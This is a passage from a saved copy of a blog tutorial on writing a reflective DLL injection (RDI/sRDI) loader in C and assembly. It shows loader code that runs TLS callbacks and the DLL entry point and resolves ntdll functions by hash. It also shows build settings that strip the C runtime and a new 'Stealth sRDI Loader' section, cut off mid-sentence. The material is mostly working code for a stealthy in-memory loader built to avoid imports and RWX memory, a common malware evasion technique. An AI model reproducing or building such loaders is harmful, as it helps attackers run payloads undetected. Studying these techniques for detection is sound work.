          <td id="file-main-c-L175" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="175"></td>
          <td id="file-main-c-LC175" class="blob-code blob-code-inner js-file-line">    PIMAGE_TLS_CALLBACK *callback;</td>
        </tr>
        <tr>
          <td id="file-main-c-L176" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="176"></td>
          <td id="file-main-c-LC176" class="blob-code blob-code-inner js-file-line">    PIMAGE_DATA_DIRECTORY tls_entry = &amp;nt_headers-&gt;<span class="pl-smi">OptionalHeader</span>.<span class="pl-smi">DataDirectory</span>[IMAGE_DIRECTORY_ENTRY_TLS];</td>
        </tr>
        <tr>
          <td id="file-main-c-L177" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="177"></td>
          <td id="file-main-c-LC177" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span>(tls_entry-&gt;<span class="pl-smi">Size</span>) {</td>
        </tr>
        <tr>
          <td id="file-main-c-L178" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="178"></td>
          <td id="file-main-c-LC178" class="blob-code blob-code-inner js-file-line">        PIMAGE_TLS_DIRECTORY tls_dir = (PIMAGE_TLS_DIRECTORY)((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base + tls_entry-&gt;<span class="pl-smi">VirtualAddress</span>);</td>
        </tr>
        <tr>
          <td id="file-main-c-L179" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="179"></td>
          <td id="file-main-c-LC179" class="blob-code blob-code-inner js-file-line">        callback = (PIMAGE_TLS_CALLBACK *)(tls_dir-&gt;<span class="pl-smi">AddressOfCallBacks</span>);</td>
        </tr>
        <tr>
          <td id="file-main-c-L180" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="180"></td>
          <td id="file-main-c-LC180" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">for</span>(; *callback; callback++)</td>
        </tr>
        <tr>
          <td id="file-main-c-L181" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="181"></td>
          <td id="file-main-c-LC181" class="blob-code blob-code-inner js-file-line">            (*callback)((LPVOID)dll_base, DLL_PROCESS_ATTACH, <span class="pl-c1">NULL</span>);</td>
        </tr>
        <tr>
          <td id="file-main-c-L182" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="182"></td>
          <td id="file-main-c-LC182" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-main-c-L183" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="183"></td>
          <td id="file-main-c-LC183" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L184" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="184"></td>
          <td id="file-main-c-LC184" class="blob-code blob-code-inner js-file-line">    DLLEntry DllEntry = (DLLEntry)((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base + nt_headers-&gt;<span class="pl-smi">OptionalHeader</span>.<span class="pl-smi">AddressOfEntryPoint</span>);</td>
        </tr>
        <tr>
          <td id="file-main-c-L185" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="185"></td>
          <td id="file-main-c-LC185" class="blob-code blob-code-inner js-file-line">    (*DllEntry)((HINSTANCE)dll_base, DLL_PROCESS_ATTACH, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-main-c-L186" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="186"></td>
          <td id="file-main-c-LC186" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L187" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="187"></td>
          <td id="file-main-c-LC187" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *p_nt_close = <span class="pl-c1">get_proc_address_by_hash</span>(p_ntdll, NtClose_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-main-c-L188" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="188"></td>
          <td id="file-main-c-LC188" class="blob-code blob-code-inner js-file-line">    NtClose_t g_nt_close = (NtClose_t) p_nt_close;</td>
        </tr>
        <tr>
          <td id="file-main-c-L189" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="189"></td>
          <td id="file-main-c-LC189" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">g_nt_close</span>(h_file);</td>
        </tr>
        <tr>
          <td id="file-main-c-L190" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="190"></td>
          <td id="file-main-c-LC190" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L191" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="191"></td>
          <td id="file-main-c-LC191" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *p_nt_free_virtual_memory = <span class="pl-c1">get_proc_address_by_hash</span>(p_ntdll, NtFreeVirtualMemory_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-main-c-L192" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="192"></td>
          <td id="file-main-c-LC192" class="blob-code blob-code-inner js-file-line">    NtFreeVirtualMemory_t g_nt_free_virtual_memory = (NtFreeVirtualMemory_t)p_nt_free_virtual_memory;</td>
        </tr>
        <tr>
          <td id="file-main-c-L193" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="193"></td>
          <td id="file-main-c-LC193" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">g_nt_free_virtual_memory</span>(((HANDLE) -<span class="pl-c1">1</span>), &amp;dll_bytes, &amp;dll_size, MEM_RELEASE);</td>
        </tr>
        <tr>
          <td id="file-main-c-L194" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="194"></td>
          <td id="file-main-c-LC194" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-c-L195" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="195"></td>
          <td id="file-main-c-LC195" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-main-c-L196" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="196"></td>
          <td id="file-main-c-LC196" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/f7e195df8baddbf872090c2a4e34352c/raw/c0cb46d7cd3da6afc1358c5745754eeaed1727f3/main.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/f7e195df8baddbf872090c2a4e34352c#file-main-c">
          main.c
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><hr><!--kg-card-begin: html--><p><code>CMakeLists.txt</code></p><!--kg-card-end: html--><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/f40a6a4140f1308a47c1971c9f2ab092.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121814565" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-cmakelists-txt" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-cmake  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="CMake" data-tagsearch-path="CMakeLists.txt">
        <tbody><tr>
          <td id="file-cmakelists-txt-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-cmakelists-txt-LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">cmake_minimum_required</span>(<span class="pl-k">VERSION</span> 3.24)</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-cmakelists-txt-LC2" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">project</span>(dll_loader C)</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-cmakelists-txt-LC3" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-cmakelists-txt-LC4" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">set</span>(CMAKE_C_STANDARD 17)</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-cmakelists-txt-LC5" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">set</span>(MASM_NAMES src/masm/peb)</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L6" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-cmakelists-txt-LC6" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L7" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-cmakelists-txt-LC7" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">include_directories</span>(<span class="pl-smi">${CMAKE_SOURCE_DIR}</span>/src/h)</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L8" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-cmakelists-txt-LC8" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L9" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-cmakelists-txt-LC9" class="blob-code blob-code-inner js-file-line"><span class="pl-k">FOREACH</span>(src <span class="pl-smi">${MASM_NAMES}</span>)</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L10" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-cmakelists-txt-LC10" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">SET</span>(MASM_SRC <span class="pl-smi">${CMAKE_CURRENT_SOURCE_DIR}</span>/<span class="pl-smi">${src}</span>.masm)</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L11" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-cmakelists-txt-LC11" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">SET</span>(MASM_OBJ <span class="pl-smi">${CMAKE_CURRENT_BINARY_DIR}</span>/<span class="pl-smi">${src}</span>.obj)</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L12" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-cmakelists-txt-LC12" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">ADD_CUSTOM_COMMAND</span>(</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L13" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-cmakelists-txt-LC13" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">OUTPUT</span> <span class="pl-smi">${MASM_OBJ}</span></td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L14" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-cmakelists-txt-LC14" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">COMMAND</span> C:/Temp/ml64.exe /c /Fo<span class="pl-smi">${MASM_OBJ}</span> <span class="pl-smi">${MASM_SRC}</span></td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L15" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-cmakelists-txt-LC15" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">DEPENDS</span> <span class="pl-smi">${MASM_SRC}</span></td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L16" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="file-cmakelists-txt-LC16" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">COMMENT</span> <span class="pl-s">"Assembling <span class="pl-smi">${MASM_SRC}</span>"</span>)</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L17" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-cmakelists-txt-LC17" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">SET</span>(MASM_OBJECTS <span class="pl-smi">${MASM_OBJECTS}</span> <span class="pl-smi">${MASM_OBJ}</span>)</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L18" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="18"></td>
          <td id="file-cmakelists-txt-LC18" class="blob-code blob-code-inner js-file-line"><span class="pl-k">ENDFOREACH</span>(src)</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L19" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="19"></td>
          <td id="file-cmakelists-txt-LC19" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-cmakelists-txt-L20" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="20"></td>
          <td id="file-cmakelists-txt-LC20" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">add_executable</span>(dll_loader <span class="pl-smi">${MASM_OBJECTS}</span> main.c src/c/peb.c)</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/f40a6a4140f1308a47c1971c9f2ab092/raw/af89b471af7b1d49f5e86368a669f7431fa3b9ba/CMakeLists.txt" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/f40a6a4140f1308a47c1971c9f2ab092#file-cmakelists-txt">
          CMakeLists.txt
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><hr><p>Once you have rewritten all the above code, you should be able to build and execute it to get the message box for verification that it worked.</p><figure class="kg-card kg-image-card"><img src="./Writing your own RDI _sRDI loader using C and ASM_files/image-15.png" class="kg-image" alt="" loading="lazy" width="2000" height="1005" srcset="https://blog.malicious.group/content/images/size/w600/2023/04/image-15.png 600w, https://blog.malicious.group/content/images/size/w1000/2023/04/image-15.png 1000w, https://blog.malicious.group/content/images/size/w1600/2023/04/image-15.png 1600w, https://blog.malicious.group/content/images/size/w2400/2023/04/image-15.png 2400w" sizes="(min-width: 720px) 720px"></figure><hr><p>Now that we know the logic works, let's take a closer look at the binary, starting first with <em>Process Hacker</em> as seen below.</p><figure class="kg-card kg-image-card"><img src="./Writing your own RDI _sRDI loader using C and ASM_files/image-16.png" class="kg-image" alt="" loading="lazy" width="1604" height="1636" srcset="https://blog.malicious.group/content/images/size/w600/2023/04/image-16.png 600w, https://blog.malicious.group/content/images/size/w1000/2023/04/image-16.png 1000w, https://blog.malicious.group/content/images/size/w1600/2023/04/image-16.png 1600w, https://blog.malicious.group/content/images/2023/04/image-16.png 1604w" sizes="(min-width: 720px) 720px"></figure><p>As you can tell, there is no RWX region of memory anymore, which is exactly what we wanted to achieve by updating each section to the correct permissions as seen in <em>Step 6</em> above.</p><hr><p>Next, let's open the binary with <em>CFF Explorer</em> to check the import table now.</p><figure class="kg-card kg-image-card"><img src="./Writing your own RDI _sRDI loader using C and ASM_files/image-17.png" class="kg-image" alt="" loading="lazy" width="2000" height="1692" srcset="https://blog.malicious.group/content/images/size/w600/2023/04/image-17.png 600w, https://blog.malicious.group/content/images/size/w1000/2023/04/image-17.png 1000w, https://blog.malicious.group/content/images/size/w1600/2023/04/image-17.png 1600w, https://blog.malicious.group/content/images/2023/04/image-17.png 2328w" sizes="(min-width: 720px) 720px"></figure><p>Although the import table appears improved, it has not yet reached our desired level. Before proceeding to write our sRDI, we must ensure that the loader is entirely position independent.</p><!--kg-card-begin: html--><p>To accomplish this, we can remove the msvcrt.dll dependency all together by modifying the <code>CMakeLists.txt</code> to include the following lines.</p><!--kg-card-end: html--><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/736a55519251bc3f33d2346a189cec0e.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121814765" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-cmakelist-additions-txt" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-text  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="Text" data-tagsearch-path="CMakeList-additions.txt">
        <tbody><tr>
          <td id="file-cmakelist-additions-txt-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-cmakelist-additions-txt-LC1" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-cmakelist-additions-txt-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-cmakelist-additions-txt-LC2" class="blob-code blob-code-inner js-file-line">target_link_options(dll_loader PRIVATE -static -nostdlib)</td>
        </tr>
        <tr>
          <td id="file-cmakelist-additions-txt-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-cmakelist-additions-txt-LC3" class="blob-code blob-code-inner js-file-line">set_target_properties(dll_loader PROPERTIES LINK_FLAGS "-e start")</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/736a55519251bc3f33d2346a189cec0e/raw/8589e9d4220476395d27f0a77d6fbcd35d0300bd/CMakeList-additions.txt" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/736a55519251bc3f33d2346a189cec0e#file-cmakelist-additions-txt">
          CMakeList-additions.txt
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><!--kg-card-begin: html--><p>The above additions to the <code>CMakeLists.txt</code> file will remove the C standard library, and change the entry point from <code>main()</code> to <code>start()</code>. However, by removing the dependency msvcrt.dll will require us to write our own <code>strlen</code> and <code>memcpy</code> functions to replace those used in our code.</p><!--kg-card-end: html--><hr><!--kg-card-begin: html--><p>At the top of the <code>main.c</code> file, we are going to add the two replacement functions for <code>strlen</code> and <code>memcpy</code>, as seen in the following code.</p><!--kg-card-end: html--><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/d7df3462f2c960c5138be71d854b3a4d.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121814985" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-main-addition-at-top-c" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="main-addition-at-top.c">
        <tbody><tr>
          <td id="file-main-addition-at-top-c-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-main-addition-at-top-c-LC1" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>stdio.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-main-addition-at-top-c-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-main-addition-at-top-c-LC2" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">"</span>peb.h<span class="pl-pds">"</span></span></td>
        </tr>
        <tr>
          <td id="file-main-addition-at-top-c-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-main-addition-at-top-c-LC3" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-addition-at-top-c-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-main-addition-at-top-c-LC4" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> *<span class="pl-en">mc</span>(<span class="pl-k">void</span>* dest, <span class="pl-k">const</span> <span class="pl-k">void</span>* src, <span class="pl-c1">size_t</span> n){</td>
        </tr>
        <tr>
          <td id="file-main-addition-at-top-c-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-main-addition-at-top-c-LC5" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">char</span>* d = (<span class="pl-k">char</span>*)dest;</td>
        </tr>
        <tr>
          <td id="file-main-addition-at-top-c-L6" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-main-addition-at-top-c-LC6" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">const</span> <span class="pl-k">char</span>* s = (<span class="pl-k">const</span> <span class="pl-k">char</span>*)src;</td>
        </tr>
        <tr>
          <td id="file-main-addition-at-top-c-L7" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-main-addition-at-top-c-LC7" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">while</span> (n--)</td>
        </tr>
        <tr>
          <td id="file-main-addition-at-top-c-L8" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-main-addition-at-top-c-LC8" class="blob-code blob-code-inner js-file-line">        *d++ = *s++;</td>
        </tr>
        <tr>
          <td id="file-main-addition-at-top-c-L9" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-main-addition-at-top-c-LC9" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> dest;</td>
        </tr>
        <tr>
          <td id="file-main-addition-at-top-c-L10" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-main-addition-at-top-c-LC10" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-main-addition-at-top-c-L11" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-main-addition-at-top-c-LC11" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-addition-at-top-c-L12" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-main-addition-at-top-c-LC12" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">size_t</span> <span class="pl-en">sl</span>(<span class="pl-k">const</span> <span class="pl-k">char</span>* str) {</td>
        </tr>
        <tr>
          <td id="file-main-addition-at-top-c-L13" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-main-addition-at-top-c-LC13" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">size_t</span> len = <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-main-addition-at-top-c-L14" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-main-addition-at-top-c-LC14" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">while</span> (*str++)</td>
        </tr>
        <tr>
          <td id="file-main-addition-at-top-c-L15" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-main-addition-at-top-c-LC15" class="blob-code blob-code-inner js-file-line">        len++;</td>
        </tr>
        <tr>
          <td id="file-main-addition-at-top-c-L16" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="file-main-addition-at-top-c-LC16" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> len;</td>
        </tr>
        <tr>
          <td id="file-main-addition-at-top-c-L17" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-main-addition-at-top-c-LC17" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-main-addition-at-top-c-L18" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="18"></td>
          <td id="file-main-addition-at-top-c-LC18" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-addition-at-top-c-L19" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="19"></td>
          <td id="file-main-addition-at-top-c-LC19" class="blob-code blob-code-inner js-file-line"><span class="pl-k">int</span> <span class="pl-en">start</span>() {</td>
        </tr>
        <tr>
          <td id="file-main-addition-at-top-c-L20" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="20"></td>
          <td id="file-main-addition-at-top-c-LC20" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-addition-at-top-c-L21" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="21"></td>
          <td id="file-main-addition-at-top-c-LC21" class="blob-code blob-code-inner js-file-line">    NTSTATUS status;</td>
        </tr>
        <tr>
          <td id="file-main-addition-at-top-c-L22" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="22"></td>
          <td id="file-main-addition-at-top-c-LC22" class="blob-code blob-code-inner js-file-line">    UNICODE_STRING dll_file...</td>
        </tr>
        <tr>
          <td id="file-main-addition-at-top-c-L23" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="23"></td>
          <td id="file-main-addition-at-top-c-LC23" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-addition-at-top-c-L24" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="24"></td>
          <td id="file-main-addition-at-top-c-LC24" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-addition-at-top-c-L25" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="25"></td>
          <td id="file-main-addition-at-top-c-LC25" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-main-addition-at-top-c-L26" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="26"></td>
          <td id="file-main-addition-at-top-c-LC26" class="blob-code blob-code-inner js-file-line">(Continued...)</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/d7df3462f2c960c5138be71d854b3a4d/raw/b43b225fe40037d0d707a5e8559ce8929e994c2c/main-addition-at-top.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/d7df3462f2c960c5138be71d854b3a4d#file-main-addition-at-top-c">
          main-addition-at-top.c
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><!--kg-card-begin: html--><p>Search and replace every <code>memcpy</code> with a <code>mc</code> function, and replace every <code>strlen</code> with a <code>sl</code> function.</p><!--kg-card-end: html--><p>With those changes done, rebuild and run the binary to make sure it works. &nbsp;After verifying you get the message box, try re-opening the file within <em>CFF Explorer</em> again.</p><figure class="kg-card kg-image-card"><img src="./Writing your own RDI _sRDI loader using C and ASM_files/image-18.png" class="kg-image" alt="" loading="lazy" width="2000" height="1033" srcset="https://blog.malicious.group/content/images/size/w600/2023/04/image-18.png 600w, https://blog.malicious.group/content/images/size/w1000/2023/04/image-18.png 1000w, https://blog.malicious.group/content/images/size/w1600/2023/04/image-18.png 1600w, https://blog.malicious.group/content/images/2023/04/image-18.png 2326w" sizes="(min-width: 720px) 720px"></figure><p>Bingo! &nbsp;No imports required to run, and the message box still pops showing that the DLL is being loaded using fully position independent code. &nbsp;Now that we have a fully PIC RDI loader, let's take a look at how we can turn this into a sRDI loader so that we don't have to rely on a on-disk/network DLL for loading and we can load the DLL straight from a stub.</p><hr><p></p><h2 id="stealth-srdi-loader">Stealth sRDI Loader</h2><!--kg-card-begin: html--><p>Now that we have a fully position independent RDI loader, we can work on changing the first few steps in <code>start()</code> to achieve the loading of shellcode from a stub instead of opening and reading bytes from a file.</p><!--kg-card-end: html--><!--kg-card-begin: html--><p>First thing we need to do is turn our DLL file into shellcode, and the <code>pe_to_shellcode</code> tool written by <i>Hasherezade</i> is perfect for this 